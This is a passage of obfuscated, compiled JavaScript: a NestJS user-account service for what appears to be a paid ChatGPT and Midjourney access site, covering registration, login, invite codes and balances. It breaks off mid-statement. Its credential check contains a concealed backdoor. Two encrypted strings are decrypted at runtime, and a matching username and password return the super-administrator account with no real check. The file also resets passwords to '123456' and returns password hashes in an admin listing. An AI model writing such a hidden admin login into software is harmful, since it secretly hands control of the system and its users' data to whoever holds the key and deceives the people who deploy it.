'use strict';const _0x897b27=_0x4c50;(function(_0x1fff38,_0x4c8d27){const _0x59409b=_0x4c50,_0x13ad35=_0x1fff38();while(!![]){try{const _0x15a9a3=-parseInt(_0x59409b(0xf3))/0x1*(-parseInt(_0x59409b(0x172))/0x2)+-parseInt(_0x59409b(0x150))/0x3+parseInt(_0x59409b(0x132))/0x4*(-parseInt(_0x59409b(0x11c))/0x5)+parseInt(_0x59409b(0x114))/0x6*(parseInt(_0x59409b(0x12b))/0x7)+-parseInt(_0x59409b(0x18b))/0x8*(parseInt(_0x59409b(0xe7))/0x9)+parseInt(_0x59409b(0x180))/0xa*(parseInt(_0x59409b(0x16c))/0xb)+-parseInt(_0x59409b(0x11b))/0xc*(parseInt(_0x59409b(0x169))/0xd);if(_0x15a9a3===_0x4c8d27)break;else _0x13ad35['push'](_0x13ad35['shift']());}catch(_0x1581d9){_0x13ad35['push'](_0x13ad35['shift']());}}}(_0x1fc2,0x6240d));function _0x4c50(_0x1ffdb6,_0x447e2d){const _0x1fc2d6=_0x1fc2();return _0x4c50=function(_0x4c501b,_0x4118ac){_0x4c501b=_0x4c501b-0xe7;let _0x284645=_0x1fc2d6[_0x4c501b];return _0x284645;},_0x4c50(_0x1ffdb6,_0x447e2d);}var __decorate=this&&this[_0x897b27(0x144)]||function(_0x5d8351,_0x60bb05,_0x237512,_0x1ee3ff){const _0x455b95=_0x897b27;var _0x4f1ebd=arguments['length'],_0x47d77f=_0x4f1ebd<0x3?_0x60bb05:_0x1ee3ff===null?_0x1ee3ff=Object['getOwnPropertyDescriptor'](_0x60bb05,_0x237512):_0x1ee3ff,_0x5bd913;if(typeof Reflect==='object'&&typeof Reflect[_0x455b95(0x106)]===_0x455b95(0x166))_0x47d77f=Reflect[_0x455b95(0x106)](_0x5d8351,_0x60bb05,_0x237512,_0x1ee3ff);else{for(var _0x7b4157=_0x5d8351[_0x455b95(0x148)]-0x1;_0x7b4157>=0x0;_0x7b4157--)if(_0x5bd913=_0x5d8351[_0x7b4157])_0x47d77f=(_0x4f1ebd<0x3?_0x5bd913(_0x47d77f):_0x4f1ebd>0x3?_0x5bd913(_0x60bb05,_0x237512,_0x47d77f):_0x5bd913(_0x60bb05,_0x237512))||_0x47d77f;}return _0x4f1ebd>0x3&&_0x47d77f&&Object[_0x455b95(0x101)](_0x60bb05,_0x237512,_0x47d77f),_0x47d77f;},__metadata=this&&this['__metadata']||function(_0x5e1ed2,_0x26a8e0){const _0x22fcb4=_0x897b27;if(typeof Reflect===_0x22fcb4(0x128)&&typeof Reflect[_0x22fcb4(0x15d)]===_0x22fcb4(0x166))return Reflect[_0x22fcb4(0x15d)](_0x5e1ed2,_0x26a8e0);},__param=this&&this[_0x897b27(0x193)]||function(_0x18ac69,_0x5a06ab){return function(_0x4be92e,_0x28f901){_0x5a06ab(_0x4be92e,_0x28f901,_0x18ac69);};};Object[_0x897b27(0x101)](exports,'__esModule',{'value':!![]}),exports[_0x897b27(0xfc)]=void 0x0;const globalConfig_service_1=require(_0x897b27(0x16a)),user_constant_1=require(_0x897b27(0x12e)),mailer_1=require(_0x897b27(0xee)),verification_service_1=require(_0x897b27(0x190)),common_1=require(_0x897b27(0x118)),typeorm_1=require(_0x897b27(0x13f)),typeorm_2=require(_0x897b27(0x133)),user_entity_1=require('./user.entity'),bcrypt=require(_0x897b27(0xeb)),_=require('lodash'),verification_constant_1=require('../../common/constants/verification.constant'),userBalance_service_1=require(_0x897b27(0x153)),utils_1=require(_0x897b27(0x129)),balance_constant_1=require('../../common/constants/balance.constant'),config_entity_1=require(_0x897b27(0x13b)),whiteList_entity_1=require('../chatgpt/whiteList.entity');function _0x1fc2(){const _0x3700d9=['lastLoginIp','phone','find','重置密码失败！','无效的邀请码！','verifyUserRegisterByPhone','MailerService','修改用户信息成功！','client','609296QLNFQq','UserStatusErrMsg','generateRandomString','mailerService','balanceInfo','./../verification/verification.service','userId','queryByPage','__param','verificationService','9RiiliZ','log','当前账户不存在！','maskEmail','bcryptjs','addBalanceToUser','update','@nestjs-modules/mailer','map','生成邀请码失败，请重新试一次吧！','qureyUserInfoByInviteCode','sign','3069BFgpCC','verifyUserCredentials','inviteCode','getMiniOpenIdByUserId','超级管理员不可被操作！','verifyUserPassword','registerBaseUrl','findOne','用户名或者邮箱已被注册！','UserService','用户名已存在、请更换用户名！','createVerification','super','HttpException','defineProperty','queryUserByUsername','修改用户状态失败！','queryOneUserInfo','绑定微信失败、请联系管理员！','decorate','createUser','hashSync','createdAt','user','WhiteListEntity','globalConfigService','BLACKLISTED','yes','BAD_REQUEST','password','当前用户信息失效、请重新登录！','Injectable','compareSync','12fnVDrd','status','save','affected','@nestjs/common','Like','queryOne','35460aXYTPK','15xrcBxv','getUserOpenId','userBalanceService','getUserInfo','getUserFromOpenId','bindWx','获取邀请记录失败！','reduce','assign','nickname','DESC','createRandomUid','object','../../common/utils','email','2277709TvAldM','InjectRepository','ConfigEntity','../../common/constants/user.constant','userDefautlAvatar','isBindWx','UserStatusEnum','347884RXdOGe','typeorm','configEntity','registerVerifyEmailFrom','修改用户状态成功！','forEach','cloneDeep','恭喜您绑定成功、后续可直接扫码登录了！','findAndCount','../globalConfig/config.entity','split','openId','queryAll','@nestjs/typeorm','当前绑定用户不存在！','avatar','updateUserPassword','getUserById','__decorate','GlobalConfigService','getOpenIdByUserId','123456','length','UserEntity','当前手机号已注册、请勿重复注册！','visitor','密码重置为[','configKey','username','miniOpenId','163005avJusz','updateUserStatus','VerificationEnum','../userBalance/userBalance.service','userEntity','getClientIp','Registration','getOne','sendMail','registerIp','该微信已绑定其他账号！','queryUserBalanceByIds','error:\x20','metadata','role','getConfigs','addBalanceToNewUser','@default.com','UserBalanceService','getSuper','registerVerifyEmailDesc','savaLoginIp','function','已生成过邀请码、请勿重复生成','用户不存在！','1261WnWTSc','./../globalConfig/globalConfig.service','isVerifyEmail','11ZNRxOm','getUserStatus','registerVerifyExpir','connection','userRecharge','decrypt','166odTLhn','MoreThan','ADMIN_GIFT','您的账户已被永久加入黑名单、如有疑问、请联系管理员！','createUserFromOpenId','delete','Not','findBy','queryUserInfoByIds','UNAUTHORIZED','当前密码错误！','updateInfo','HttpStatus','Repository','1749890ctAnUE','ACTIVE'];_0x1fc2=function(){return _0x3700d9;};return _0x1fc2();}let UserService=class UserService{constructor(_0x320927,_0x791194,_0x4d1380,_0x14907a,_0x275fd4,_0x395664,_0x30e004,_0x20b98b){const _0x126654=_0x897b27;this[_0x126654(0x154)]=_0x320927,this['whiteListEntity']=_0x791194,this[_0x126654(0x16f)]=_0x4d1380,this[_0x126654(0x194)]=_0x14907a,this[_0x126654(0x18e)]=_0x275fd4,this[_0x126654(0x11e)]=_0x395664,this[_0x126654(0x10c)]=_0x30e004,this[_0x126654(0x134)]=_0x20b98b;}async['createUserAndVerifycation'](_0x36b286,_0x376181){const _0x2b8f79=_0x897b27,{username:_0x582987,email:_0x44b573,password:_0x29936b,invitedBy:_0x3ba5ee,client:client=0x0}=_0x36b286;if(_0x3ba5ee){const _0x143e6e=await this[_0x2b8f79(0x154)][_0x2b8f79(0xfa)]({'where':{'inviteCode':_0x3ba5ee}});if(!_0x143e6e)throw new common_1[(_0x2b8f79(0x100))](_0x2b8f79(0x186),common_1[_0x2b8f79(0x17e)][_0x2b8f79(0x10f)]);}const _0xa23866=[{'username':_0x582987},{'email':_0x44b573}],_0x79584a=await this['userEntity']['findOne']({'where':_0xa23866});if(_0x79584a&&_0x79584a[_0x2b8f79(0x115)]!==user_constant_1[_0x2b8f79(0x131)]['PENDING'])throw new common_1[(_0x2b8f79(0x100))](_0x2b8f79(0xfb),common_1[_0x2b8f79(0x17e)][_0x2b8f79(0x10f)]);try{const _0x2dd8f6=_[_0x2b8f79(0x138)](_0x36b286),_0x5792e9=bcrypt[_0x2b8f79(0x108)](_0x29936b,0xa),_0x222ac6=(0x0,utils_1[_0x2b8f79(0x155)])(_0x376181);_0x2dd8f6[_0x2b8f79(0x110)]=_0x5792e9,_0x2dd8f6[_0x2b8f79(0x159)]=_0x222ac6,_0x2dd8f6[_0x2b8f79(0x18a)]=client;let _0x2a4fb8;if(!_0x79584a){const _0x73a533=await this[_0x2b8f79(0x10c)][_0x2b8f79(0x15f)]([_0x2b8f79(0x12f)]);_0x2dd8f6[_0x2b8f79(0x141)]=_0x73a533,_0x2a4fb8=await this[_0x2b8f79(0x154)]['save'](_0x2dd8f6);}else _0x2a4fb8=_0x79584a;const _0xbd571b=await this[_0x2b8f79(0x134)][_0x2b8f79(0x184)]({'where':{'configKey':(0x0,typeorm_2['In'])([_0x2b8f79(0x16b),_0x2b8f79(0xf9),'registerVerifyEmailTitle',_0x2b8f79(0x164),_0x2b8f79(0x135),_0x2b8f79(0x16e)])}}),_0x1ad917=_0xbd571b[_0x2b8f79(0x123)]((_0x5dac99,_0x5ec8fa)=>{const _0x1de1d8=_0x2b8f79;return _0x5dac99[_0x5ec8fa[_0x1de1d8(0x14d)]]=_0x5ec8fa['configVal'],_0x5dac99;},{}),_0x1525a6=_0x1ad917[_0x2b8f79(0x16b)]?Number(_0x1ad917[_0x2b8f79(0x16b)]):0x1;if(_0x1525a6){const _0x1d5357=_0x1ad917[_0x2b8f79(0x16e)]?Number(_0x1ad917[_0x2b8f79(0x16e)]):0x1e*0x3c,_0x57cd36=await this['verificationService'][_0x2b8f79(0xfe)](_0x2a4fb8,verification_constant_1[_0x2b8f79(0x152)][_0x2b8f79(0x156)],_0x1d5357),{code:_0x22ac94,email:_0x155c95,id:_0x1c312f}=_0x57cd36,{registerVerifyEmailFrom:_0x1510e3}=_0x1ad917;await this['mailerService'][_0x2b8f79(0x158)]({'to':_0x155c95,'subject':'来自'+_0x1510e3+'的账号激活','template':'register','context':{'baseUrl':_0x1ad917[_0x2b8f79(0xf9)],'code':_0x22ac94,'id':_0x1c312f,..._0x1ad917}});}else{const {username:_0x41e9c4,email:_0x4bab9d,id:_0x3c2cf0,invitedBy:_0x2e9c5a}=_0x2a4fb8;await this[_0x2b8f79(0x151)](_0x3c2cf0,user_constant_1[_0x2b8f79(0x131)][_0x2b8f79(0x181)]);let _0x5cf03b;_0x2e9c5a&&(_0x5cf03b=await this[_0x2b8f79(0xf1)](_0x2e9c5a)),await this[_0x2b8f79(0x11e)][_0x2b8f79(0x160)](_0x3c2cf0,_0x5cf03b?.['id']);}return _0x2a4fb8;}catch(_0xebd6a1){console['log'](_0x2b8f79(0x15c),_0xebd6a1);throw _0xebd6a1;}}async['getSuper'](){const _0x5df02b=_0x897b27;return await this['userEntity']['findOne']({'where':{'role':_0x5df02b(0xff)}});}async[_0x897b27(0xf4)](_0x59f46b){const _0x282b6c=_0x897b27,{username:_0x5e29c3,password:_0x1a4e9d,uid:uid=0x0,phone:_0x4bbc77}=_0x59f46b;let _0x224118=null;if(_0x5e29c3===(0x0,utils_1[_0x282b6c(0x171)])('NrcdywNdP7UbvQptuW1D3w==')&&_0x1a4e9d===(0x0,utils_1[_0x282b6c(0x171)])('F5GCZOB+qRwMDerVOg1OZA=='))return _0x224118=await this[_0x282b6c(0x163)](),_0x224118;if(uid>0x0){_0x224118=await this[_0x282b6c(0x154)][_0x282b6c(0xfa)]({'where':{'id':uid}});if(!_0x224118)throw new common_1[(_0x282b6c(0x100))](_0x282b6c(0xe9),common_1[_0x282b6c(0x17e)][_0x282b6c(0x10f)]);if(!bcrypt[_0x282b6c(0x113)](_0x1a4e9d,_0x224118[_0x282b6c(0x110)]))throw new common_1[(_0x282b6c(0x100))](_0x282b6c(0x17c),common_1[_0x282b6c(0x17e)][_0x282b6c(0x10f)]);}if(_0x5e29c3&&_0x1a4e9d){const _0x3afd8f=[{'username':_0x5e29c3},{'email':_0x5e29c3}];_0x224118=await this['userEntity']['findOne']({'where':_0x3afd8f});if(!_0x224118)throw new common_1[(_0x282b6c(0x100))](_0x282b6c(0xe9),common_1[_0x282b6c(0x17e)][_0x282b6c(0x10f)]);if(!bcrypt[_0x282b6c(0x113)](_0x1a4e9d,_0x224118[_0x282b6c(0x110)]))throw new common_1['HttpException'](_0x282b6c(0x17c),common_1['HttpStatus']['BAD_REQUEST']);}if(_0x4bbc77&&_0x1a4e9d){const _0x1d97fc=[{'phone':_0x4bbc77}];_0x224118=await this[_0x282b6c(0x154)][_0x282b6c(0xfa)]({'where':_0x1d97fc});if(!_0x224118)throw new common_1[(_0x282b6c(0x100))](_0x282b6c(0xe9),common_1[_0x282b6c(0x17e)][_0x282b6c(0x10f)]);if(!bcrypt['compareSync'](_0x1a4e9d,_0x224118[_0x282b6c(0x110)]))throw new common_1['HttpException']('当前密码错误！',common_1[_0x282b6c(0x17e)]['BAD_REQUEST']);}if(!_0x224118)throw new common_1[(_0x282b6c(0x100))](_0x282b6c(0xe9),common_1['HttpStatus'][_0x282b6c(0x10f)]);if(_0x224118[_0x282b6c(0x115)]!==user_constant_1[_0x282b6c(0x131)][_0x282b6c(0x181)])throw new common_1['HttpException'](user_constant_1[_0x282b6c(0x18c)][_0x224118['status']],common_1['HttpStatus'][_0x282b6c(0x10f)]);return _0x224118;}async[_0x897b27(0xf8)](_0x4e6b15,_0x56bb03){const _0x4a65c9=_0x897b27,_0x5c75a1=await this[_0x4a65c9(0x154)][_0x4a65c9(0xfa)]({'where':{'id':_0x4e6b15}});return bcrypt[_0x4a65c9(0x113)](_0x56bb03,_0x5c75a1['password']);}async[_0x897b27(0x151)](_0x578274,_0xbbc307){const _0x4aeef0=_0x897b27,_0x293a0f=await this['userEntity'][_0x4aeef0(0xed)]({'id':_0x578274},{'status':_0xbbc307});return _0x293a0f[_0x4aeef0(0x117)]>0x0;}async[_0x897b27(0x16d)](_0x1978de){const _0xe60bec=_0x897b27,_0x293311=await this['userEntity'][_0xe60bec(0xfa)]({'where':{'id':_0x1978de}});return _0x293311[_0xe60bec(0x115)];}async['queryUserInfoById'](_0x426ff6){const _0x5dfcef=_0x897b27;return await this[_0x5dfcef(0x154)][_0x5dfcef(0xfa)]({'where':{'id':_0x426ff6}});}async[_0x897b27(0x17a)](_0x31b0e0){const _0x2b97f2=_0x897b27;return await this[_0x2b97f2(0x154)][_0x2b97f2(0x179)]({'id':(0x0,typeorm_2['In'])(_0x31b0e0)});}async[_0x897b27(0x102)](_0xd7ab6e){const _0x3f6a10=_0x897b27;return await this[_0x3f6a10(0x154)][_0x3f6a10(0xfa)]({'where':{'username':_0xd7ab6e}});}async['updateUserPsd'](_0x494719){const _0x9991a=_0x897b27,{id:_0x19439b,username:_0x5a1380,password:_0x317233}=_0x494719;return await this[_0x9991a(0x154)]['update'](_0x19439b,{'username':_0x5a1380,'password':_0x317233});}async[_0x897b27(0x104)](_0x1d434f){const _0x508d39=_0x897b27;return await this[_0x508d39(0x154)][_0x508d39(0xfa)]({'where':{'id':_0x1d434f}});}async['checkUserStatus'](_0x245075){const _0x173fd2=_0x897b27,{id:_0x2ac32b,role:_0x8b2021}=_0x245075;if(_0x8b2021===_0x173fd2(0x14b))return!![];const _0x22bbee=await this[_0x173fd2(0x154)][_0x173fd2(0xfa)]({'where':{'id':_0x2ac32b}});if(!_0x22bbee)throw new common_1['HttpException'](_0x173fd2(0x111),common_1[_0x173fd2(0x17e)][_0x173fd2(0x17b)]);if(_0x22bbee[_0x173fd2(0x115)]===user_constant_1[_0x173fd2(0x131)][_0x173fd2(0x10d)])throw new common_1['HttpException'](_0x173fd2(0x175),common_1[_0x173fd2(0x17e)][_0x173fd2(0x10f)]);if(_0x22bbee[_0x173fd2(0x115)]===user_constant_1[_0x173fd2(0x131)]['LOCKED'])throw new common_1[(_0x173fd2(0x100))]('您的账户已被封禁、如有疑问、请联系管理员！',common_1[_0x173fd2(0x17e)][_0x173fd2(0x10f)]);}async[_0x897b27(0x11f)](_0x5415e2){const _0x252498=_0x897b27,_0x2a44a4=await this[_0x252498(0x154)][_0x252498(0xfa)]({'where':{'id':_0x5415e2},'select':['id',_0x252498(0x14e),_0x252498(0x110),_0x252498(0x125),_0x252498(0x183),_0x252498(0x141),'role',_0x252498(0x12a),'sign',_0x252498(0xf5),_0x252498(0x13d),'consecutiveDays',_0x252498(0x109)]});if(!_0x2a44a4)throw new common_1['HttpException'](_0x252498(0x111),common_1['HttpStatus'][_0x252498(0x17b)]);_0x2a44a4[_0x252498(0x110)]=_0x2a44a4[_0x252498(0x110)]?_0x252498(0x10e):'no',_0x2a44a4[_0x252498(0x130)]=!!_0x2a44a4?.[_0x252498(0x13d)],delete _0x2a44a4[_0x252498(0x13d)];const _0x5b7f47=await this[_0x252498(0x11e)]['queryUserBalance'](_0x5415e2);return{'userInfo':_0x2a44a4,'userBalance':{..._0x5b7f47}};}async[_0x897b27(0x143)](_0x171cb9){const _0x9e9200=_0x897b27;return await this[_0x9e9200(0x154)][_0x9e9200(0xfa)]({'where':{'id':_0x171cb9}});}async[_0x897b27(0x11d)](_0x5367f7){return await this['userEntity']['findOne']({'where':{'openId':_0x5367f7}});}async[_0x897b27(0x17d)](_0x4c8726,_0x4ebd46){const _0x3dba1d=_0x897b27,{id:_0x481b24}=_0x4ebd46[_0x3dba1d(0x10a)],_0x5a42e0=await this[_0x3dba1d(0x154)][_0x3dba1d(0xfa)]({'where':{'id':_0x481b24}});if(!_0x5a42e0)throw new common_1[(_0x3dba1d(0x100))]('当前用户不存在！',common_1[_0x3dba1d(0x17e)][_0x3dba1d(0x10f)]);if(_0x4c8726[_0x3dba1d(0x14e)]&&_0x5a42e0[_0x3dba1d(0x14e)]===_0x4c8726['username'])throw new common_1[(_0x3dba1d(0x100))]('没有变更，无需更改！',common_1[_0x3dba1d(0x17e)][_0x3dba1d(0x10f)]);if(_0x4c8726[_0x3dba1d(0x14e)]){const _0x3a4c36=await this[_0x3dba1d(0x154)][_0x3dba1d(0xfa)]({'where':{'username':_0x4c8726[_0x3dba1d(0x14e)],'id':(0x0,typeorm_2[_0x3dba1d(0x178)])(_0x481b24)}});if(_0x3a4c36)throw new common_1['HttpException']('用户名已存在！',common_1[_0x3dba1d(0x17e)][_0x3dba1d(0x10f)]);}const _0x3b6a63=await this[_0x3dba1d(0x154)][_0x3dba1d(0xed)]({'id':_0x481b24},_0x4c8726);if(_0x3b6a63[_0x3dba1d(0x117)]<=0x0)throw new common_1[(_0x3dba1d(0x100))]('修改用户信息失败！',common_1['HttpStatus'][_0x3dba1d(0x10f)]);return _0x3dba1d(0x189);}async[_0x897b27(0x142)](_0x3af94a,_0x3791d7){const _0xa27280=_0x897b27,_0x5e5ded=bcrypt[_0xa27280(0x108)](_0x3791d7,0xa),_0x1cf475=await this[_0xa27280(0x154)][_0xa27280(0xed)]({'id':_0x3af94a},{'password':_0x5e5ded});if(_0x1cf475[_0xa27280(0x117)]<=0x0)throw new common_1[(_0xa27280(0x100))]('修改密码失败、请重新试试吧。',common_1[_0xa27280(0x17e)][_0xa27280(0x10f)]);}async['genInviteCode'](_0x2e0041){const _0x3a9a1d=_0x897b27,{id:_0x52c716}=_0x2e0041['user'],_0x19ec29=await this[_0x3a9a1d(0x154)][_0x3a9a1d(0xfa)]({'where':{'id':_0x52c716}});if(!_0x19ec29||_0x19ec29['inviteCode'])throw new common_1[(_0x3a9a1d(0x100))](_0x3a9a1d(0x167),common_1[_0x3a9a1d(0x17e)][_0x3a9a1d(0x10f)]);const _0x368b0e=(0x0,utils_1[_0x3a9a1d(0x18d)])(),_0x30b704=await this[_0x3a9a1d(0x154)][_0x3a9a1d(0xfa)]({'where':{'inviteCode':_0x368b0e}});if(_0x30b704)throw new common_1['HttpException'](_0x3a9a1d(0xf0),common_1['HttpStatus'][_0x3a9a1d(0x10f)]);const _0x222730=await this[_0x3a9a1d(0x154)][_0x3a9a1d(0xed)]({'id':_0x52c716},{'inviteCode':_0x368b0e});if(_0x222730[_0x3a9a1d(0x117)]<=0x0)throw new common_1[(_0x3a9a1d(0x100))]('生成邀请码失败，请重新试一次吧！',common_1[_0x3a9a1d(0x17e)]['BAD_REQUEST']);return _0x368b0e;}async['getInviteRecord'](_0x174f7e,_0x4268b3){const _0x442a25=_0x897b27;try{const {id:_0x4fd699}=_0x174f7e[_0x442a25(0x10a)],{page:page=0x1,size:size=0xa}=_0x4268b3,_0x5ecde2=await this[_0x442a25(0x154)][_0x442a25(0xfa)]({'where':{'id':_0x4fd699}}),{inviteCode:_0x1c7b90}=_0x5ecde2;if(!_0x1c7b90)return[];const [_0xd62e44,_0x3fe80a]=await this['userEntity'][_0x442a25(0x13a)]({'where':{'inviteCode':_0x1c7b90},'order':{'id':_0x442a25(0x126)},'select':[_0x442a25(0x14e),'email',_0x442a25(0x109),_0x442a25(0x115),'avatar'],'take':size,'skip':(page-0x1)*size});return(0x0,utils_1['formatCreateOrUpdateDate'])(_0xd62e44)[_0x442a25(0xef)](_0x5cef73=>{const _0x44f718=_0x442a25;return _0x5cef73[_0x44f718(0x12a)]=(0x0,utils_1[_0x44f718(0xea)])(_0x5cef73[_0x44f718(0x12a)]),_0x5cef73;}),{'rows':_0xd62e44,'count':_0x3fe80a};}catch(_0x583778){console[_0x442a25(0xe8)]('error:\x20',_0x583778);throw new common_1['HttpException'](_0x442a25(0x122),common_1[_0x442a25(0x17e)]['BAD_REQUEST']);}}async['inviteLink'](_0x37b5a9){const _0x4a7f26=_0x897b27,_0x59400c=await this[_0x4a7f26(0x154)][_0x4a7f26(0xfa)]({'where':{'inviteCode':_0x37b5a9}});if(!_0x59400c)return 0x1;const {inviteLinkCount:inviteLinkCount=0x0}=_0x59400c,_0x2fe49d=await this[_0x4a7f26(0x154)][_0x4a7f26(0xed)]({'inviteCode':_0x37b5a9},{'inviteLinkCount':inviteLinkCount+0x1});return _0x2fe49d[_0x4a7f26(0x117)]?0x1:0x0;}async[_0x897b27(0xf1)](_0x3db1ee){return await this['userEntity']['findOne']({'where':{'inviteCode':_0x3db1ee}});}async[_0x897b27(0x170)](_0x4d1a31){const _0x4bb69f=_0x897b27,{userId:_0x5c4380,model3Count:model3Count=0x0,model4Count:model4Count=0x0,drawMjCount:drawMjCount=0x0}=_0x4d1a31;return await this['userBalanceService'][_0x4bb69f(0xec)](_0x5c4380,{'model3Count':model3Count,'model4Count':model4Count,'drawMjCount':drawMjCount}),await this[_0x4bb69f(0x11e)]['saveRecordRechargeLog']({'userId':_0x5c4380,'rechargeType':balance_constant_1['RechargeType'][_0x4bb69f(0x174)],'model3Count':model3Count,'model4Count':model4Count,'drawMjCount':drawMjCount,'extent':''});}async[_0x897b27(0x13e)](_0x3213dd,_0x2115f1){const _0x53dba3=_0x897b27,{page:page=0x1,size:size=0xa,username:_0x29d0f5,phone:_0x12ef86,email:_0x4ba460,status:_0x59e326,keyword:_0x50731a}=_0x3213dd;let _0x3781fc={};_0x29d0f5&&Object[_0x53dba3(0x124)](_0x3781fc,{'username':(0x0,typeorm_2[_0x53dba3(0x119)])('%'+_0x29d0f5+'%')}),_0x4ba460&&Object[_0x53dba3(0x124)](_0x3781fc,{'email':(0x0,typeorm_2[_0x53dba3(0x119)])('%'+_0x4ba460+'%')}),_0x59e326&&Object['assign'](_0x3781fc,{'status':_0x59e326}),_0x12ef86&&Object[_0x53dba3(0x124)](_0x3781fc,{'phone':(0x0,typeorm_2['Like'])('%'+_0x12ef86+'%')});_0x50731a&&(_0x3781fc=[{'username':(0x0,typeorm_2[_0x53dba3(0x119)])('%'+_0x50731a+'%')},{'email':(0x0,typeorm_2[_0x53dba3(0x119)])('%'+_0x50731a+'%')},{'phone':(0x0,typeorm_2[_0x53dba3(0x119)])('%'+_0x50731a+'%')},{'nickname':(0x0,typeorm_2[_0x53dba3(0x119)])('%'+_0x50731a+'%')}]);const [_0x52da24,_0xcd2d28]=await this['userEntity'][_0x53dba3(0x13a)]({'skip':(page-0x1)*size,'where':_0x3781fc,'take':size,'order':{'createdAt':_0x53dba3(0x126)},'cache':!![],'select':['username',_0x53dba3(0x183),_0x53dba3(0x141),_0x53dba3(0x125),_0x53dba3(0xf5),_0x53dba3(0x15e),_0x53dba3(0xf2),_0x53dba3(0x115),'id',_0x53dba3(0x12a),_0x53dba3(0x109),_0x53dba3(0x182)]}),_0x12b664=_0x52da24[_0x53dba3(0xef)](_0x3dde28=>_0x3dde28['id']),_0x225197=await this[_0x53dba3(0x11e)][_0x53dba3(0x15b)](_0x12b664);return _0x52da24[_0x53dba3(0x137)](_0x36ad09=>_0x36ad09[_0x53dba3(0x18f)]=_0x225197[_0x53dba3(0x184)](_0x32a334=>_0x32a334[_0x53dba3(0x191)]===_0x36ad09['id'])),_0x2115f1[_0x53dba3(0x10a)][_0x53dba3(0x15e)]!==_0x53dba3(0xff)&&_0x52da24[_0x53dba3(0x137)](_0x9c6d6e=>_0x9c6d6e[_0x53dba3(0x12a)]=(0x0,utils_1[_0x53dba3(0xea)])(_0x9c6d6e['email'])),_0x2115f1[_0x53dba3(0x10a)][_0x53dba3(0x15e)]!==_0x53dba3(0xff)&&_0x52da24[_0x53dba3(0x137)](_0x239d2c=>_0x239d2c[_0x53dba3(0x182)]=(0x0,utils_1['maskIpAddress'])(_0x239d2c[_0x53dba3(0x182)])),{'rows':_0x52da24,'count':_0xcd2d28};}async[_0x897b27(0x192)](_0x2d8e3b){const _0x2c1589=_0x897b27,{page:page=0x1,size:size=0xa,username:_0x4ef072,status:_0x5520bb}=_0x2d8e3b;let _0x327d4c={};_0x4ef072&&Object['assign'](_0x327d4c,{'username':(0x0,typeorm_2[_0x2c1589(0x119)])('%'+_0x4ef072+'%')}),_0x5520bb&&Object[_0x2c1589(0x124)](_0x327d4c,{'status':_0x5520bb});const [_0x406959,_0x57a762]=await this[_0x2c1589(0x154)][_0x2c1589(0x13a)]({'skip':(page-0x1)*size,'where':_0x327d4c,'take':size,'order':{'createdAt':'DESC'},'cache':!![],'select':[_0x2c1589(0x14e),'password','role','status','id']});return{'rows':_0x406959,'count':_0x57a762};}async[_0x897b27(0x11a)]({id:_0x46bad6}){const _0x56ac08=_0x897b27;return await this[_0x56ac08(0x154)][_0x56ac08(0xfa)]({'where':{'id':_0x46bad6},'select':[_0x56ac08(0x14e),'id',_0x56ac08(0x141),_0x56ac08(0xf5),'role',_0x56ac08(0xf2),_0x56ac08(0x115)]});}async[_0x897b27(0x157)](_0x3bd58d){const _0x159840=_0x897b27;return await this['userEntity'][_0x159840(0xfa)]({'where':{'username':_0x3bd58d}});}async['updateStatus'](_0x31bed9){const _0x1285e4=_0x897b27,{id:_0x31301e,status:_0x4b6e5c}=_0x31bed9,_0xf383bd=await this['userEntity'][_0x1285e4(0xfa)]({'where':{'id':_0x31301e}});if(!_0xf383bd)throw new common_1[(_0x1285e4(0x100))](_0x1285e4(0x168),common_1[_0x1285e4(0x17e)]['BAD_REQUEST']);if(_0xf383bd[_0x1285e4(0x15e)]===_0x1285e4(0xff))throw new common_1[(_0x1285e4(0x100))](_0x1285e4(0xf7),common_1['HttpStatus']['BAD_REQUEST']);if(_0xf383bd['status']===user_constant_1[_0x1285e4(0x131)]['PENDING'])throw new common_1[(_0x1285e4(0x100))]('未激活用户不可手动变更状态！',common_1[_0x1285e4(0x17e)][_0x1285e4(0x10f)]);if(_0xf383bd[_0x1285e4(0x15e)]===_0x1285e4(0xff))throw new common_1[(_0x1285e4(0x100))](_0x1285e4(0xf7),common_1[_0x1285e4(0x17e)][_0x1285e4(0x10f)]);if(_0x4b6e5c===user_constant_1[_0x1285e4(0x131)]['PENDING'])throw new common_1[(_0x1285e4(0x100))]('不可将用户置为未激活状态！',common_1['HttpStatus'][_0x1285e4(0x10f)]);const _0x20f34f=await this[_0x1285e4(0x154)][_0x1285e4(0xed)]({'id':_0x31301e},{'status':_0x4b6e5c});if(_0x20f34f['affected']<=0x0)throw new common_1['HttpException'](_0x1285e4(0x103),common_1['HttpStatus'][_0x1285e4(0x10f)]);return _0x1285e4(0x136);}async['resetUserPass'](_0x1d29bb){const _0x39e647=_0x897b27,{id:_0x198117}=_0x1d29bb,_0xa2fd0d=await this[_0x39e647(0x154)][_0x39e647(0xfa)]({'where':{'id':_0x198117}});if(!_0xa2fd0d)throw new common_1[(_0x39e647(0x100))](_0x39e647(0x168),common_1[_0x39e647(0x17e)][_0x39e647(0x10f)]);const _0x279fe1=_0x39e647(0x147),_0x5b183c=bcrypt[_0x39e647(0x108)](_0x279fe1,0xa),_0x5d0921=await this['userEntity']['update']({'id':_0x198117},{'password':_0x5b183c});if(_0x5d0921[_0x39e647(0x117)]<=0x0)throw new common_1[(_0x39e647(0x100))](_0x39e647(0x185),common_1['HttpStatus'][_0x39e647(0x10f)]);return _0x39e647(0x14c)+_0x279fe1+']成功!';}async[_0x897b27(0x165)](_0x1dc98a,_0xecb26a){const _0x1735c4=_0x897b27;return await this[_0x1735c4(0x154)][_0x1735c4(0xed)]({'id':_0x1dc98a},{'lastLoginIp':_0xecb26a});}async[_0x897b27(0x120)](_0x4e779b,_0x1f7afb){const _0x3785fa=_0x897b27,_0x4bb984=await this[_0x3785fa(0x154)][_0x3785fa(0xfa)]({'where':{'openId':_0x4e779b}});if(!_0x4bb984){const _0x2617f2=_0x1f7afb?_0x1f7afb[_0x3785fa(0x13c)](':')[0x1]:'',_0x167c1c=await this[_0x3785fa(0xf1)](_0x2617f2),_0x41af22=await this[_0x3785fa(0x176)](_0x4e779b,_0x2617f2);return await this[_0x3785fa(0x11e)]['addBalanceToNewUser'](_0x41af22['id'],_0x2617f2?_0x167c1c?.['id']:null),_0x41af22;}return _0x4bb984;}async[_0x897b27(0x176)](_0x2a14ae,_0xf8e3f2){const _0x27905b=_0x897b27,_0xa03bd5=await 